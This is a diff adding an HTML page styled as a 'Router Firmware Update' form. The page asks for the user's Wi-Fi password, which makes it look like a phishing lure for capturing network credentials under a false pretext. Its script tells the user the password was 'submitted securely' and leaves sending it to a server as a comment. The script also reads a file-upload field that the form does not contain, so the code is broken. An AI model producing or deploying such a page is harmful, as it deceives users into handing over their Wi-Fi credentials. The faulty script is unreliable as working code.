@@ -1,0 +1,81 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Router Firmware Update</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f4f4f9;
+            margin: 0;
+            padding: 20px;
+        }
+        .container {
+            max-width: 400px;
+            margin: 0 auto;
+            padding: 20px;
+            background-color: white;
+            border-radius: 10px;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+        }
+        h1 {
+            font-size: 24px;
+            margin-bottom: 20px;
+            text-align: center;
+        }
+        label {
+            display: block;
+            margin-bottom: 10px;
+            font-weight: bold;
+        }
+        input[type="file"], input[type="password"], button {
+            width: 100%;
+            padding: 10px;
+            margin-bottom: 15px;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+            font-size: 16px;
+        }
+        button {
+            background-color: #007bff;
+            color: white;
+            border: none;
+            cursor: pointer;
+        }
+        button:hover {
+            background-color: #0056b3;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>Router Firmware Update</h1>
+        <form id="firmwareUpdateForm">
+            
+            <label for="wifiPassword">Enter Wi-Fi Password:</label>
+            <input type="password" id="wifiPassword" name="wifiPassword" placeholder="Wi-Fi Password" required>
+
+            <button type="submit">Update Firmware</button>
+        </form>
+    </div>
+
+    <script>
+        document.getElementById('firmwareUpdateForm').addEventListener('submit', function (e) {
+            e.preventDefault(); // Prevent form submission for demonstration purposes
+
+            const firmwareFile = document.getElementById('firmwareFile').files[0];
+            const wifiPassword = document.getElementById('wifiPassword').value;
+
+            if (!firmwareFile || !wifiPassword) {
+                alert('Please fill out all fields.');
+                return;
+            }
+
+            alert('Firmware file and Wi-Fi password submitted securely.');
+            
+            // Implement further actions here, like sending data to a secure server.
+        });
+    </script>
+</body>
+</html>
